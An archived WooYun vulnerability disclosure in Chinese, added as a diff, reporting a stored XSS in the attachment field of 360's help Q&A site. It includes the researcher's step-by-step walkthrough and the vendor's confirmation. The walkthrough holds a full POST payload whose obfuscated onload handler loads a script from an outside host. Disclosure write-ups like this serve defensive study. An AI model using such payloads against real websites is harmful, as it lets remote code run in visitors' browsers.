@@ -1,0 +1,260 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		360某站存储型XSS - 俺是来看360收乌云发的洞不～～  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		360某站存储型XSS - 俺是来看360收乌云发的洞不～～  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-06-10 14:20</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-10：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-20：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-30：	细节向普通白帽子公开<br/>
+									2012-07-10：	细节向实习白帽子公开<br/>
+									2012-07-25：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">昨天看到群里的Snow说360又有WEB类的奖励了，兴致勃勃的提交了攒了好久的反射型XSS过去。结果回复是有人提交了。 = = 还好俺攒的多，就又发了一个，这次360回复确认了，周一安排奖励，挺好。 <br />
+<br />
+360大部分都是客户端产品，WEB类的网站，大多本质都是导航类的网站，有用户内容交互的网站为数不多，比如论坛...，所以俺这个存储型XSS，对360的用户安全危害应该算是挺大的了，而且攻击可以做到很高的隐蔽性。 <br />
+<br />
+PS：如果不算之前那个误报的～， 貌似是乌云上360的第一个的存储型XSS<br />
+<br />
+----------------------------------<br />
+<br />
+QQ的漏洞响应平台已经明确指出：“1、奖励只针对通过TSRC官网在线漏洞提交系统反馈的用户”<br />
+<br />
+在360的奖励页面，暂时未发现上述规定，只有“并对符合信息保密原则和获奖资格的报告者予以公开”这一条规定，因为乌云也是对漏洞有保密措施的， 这是否意味着通过乌云提交的漏洞，也可以获得相应奖励？<br />
+<br />
+或者说，360也默许了QQ的那条规定？一定要“直接”提交给你们，才发放奖励呢？<br />
+<br />
+---------------<br />
+<br />
+哈哈，不好意思，俺又发牢骚了。 只是觉得乌云做起来不容易，你们搞安全的应该多多支持乌云才对。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 首先是google搜索, inurl:(upload) site:360.cn<br />
+<br />
+<br />
+<br />
+发现：http://help.360.cn/upload.html 这个页面。<br />
+<br />
+<br />
+<br />
+2. 然后就去 help.360.cn ，一看，原来是一个问答型的网站。<br />
+<br />
+<br />
+<br />
+3. 找了个问题，回答了一下，并上传了一个rar附件。 然后提交回复，同时抓包。<br />
+<br />
+<br />
+<br />
+4. 还是俺的老习惯。 F12，打开调试工具，查看刚回复的内容。看输出。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1013041874dbb94e847cc85708bb10099f98d4f3.jpg" target="_blank"><img src="../images/1013041874dbb94e847cc85708bb10099f98d4f3.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+同时，我们可以注意抓包的内容，看输入<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/101304326dc5ea4baccb692f20e4a8a0dfe78b45.jpg" target="_blank"><img src="../images/101304326dc5ea4baccb692f20e4a8a0dfe78b45.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 如果输入没过滤 &quot;, &gt; 就会带来问题。 因此，我先讲 attach 参数改为以下内容：<br />
+<br />
+<br />
+<br />
+|help_7f7b1b4ef061be3a&quot;&gt;.rar|help_7f7b1b4ef061be3a.rar<br />
+<br />
+<br />
+<br />
+6. 提交后，查看页面，可以看到，由于提前关闭HTML标签，代码侧漏了。<br />
+<br />
+<br />
+<br />
+7. 因而我们可以进一步构造利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>POST http://help.360.cn/index.php?c=insert&amp;a=doedit<br />
+<br />
+POSTDATA<br />
+<br />
+attach 参数修改为:<br />
+<br />
+|help_7f7b1b4ef061be3a&quot;&gt;&lt;img/src=&quot;/img/attach.gif&quot;onload=&quot;window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,116,46,115,105,110,97,97,112,112,46,99,111,109,47,110,111,46,106,115);document.body.appendChild(window.s)&quot;&gt;&lt;a/style=&quot;display:none&quot;b=&quot;.rar|help_7f7b1b4ef061be3a.rar</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+8. 考虑到网站访问量可能较大，为了避免测试的时候，被不良之人看到弹窗了，上面的代码仅仅是加载了我自己网站的一个空的JS文件。<br />
+<br />
+<br />
+<br />
+打开httpwatch，对被插入代码的页面进行抓包，可以看到，我的JS文件被加载了。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/10130449e37c707f94399bb57653c282621c169f.jpg" target="_blank"><img src="../images/10130449e37c707f94399bb57653c282621c169f.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+进一步证明，打开调试工具，定位到插入的内容。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/10130501b028f5e659ef0e43b20b687acb1bb303.jpg" target="_blank"><img src="../images/10130501b028f5e659ef0e43b20b687acb1bb303.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明。<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对 http://help.360.cn/index.php?c=insert&amp;a=doedit 页面，在提交问题和编辑问题时发送的attach参数进行严格的审查过滤。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08141" title="360某站存储型XSS - 俺是来看360收乌云发的洞不～～">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-06-10 15:08</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对360的支持，您反馈的漏洞已经确认并正在修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8141";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
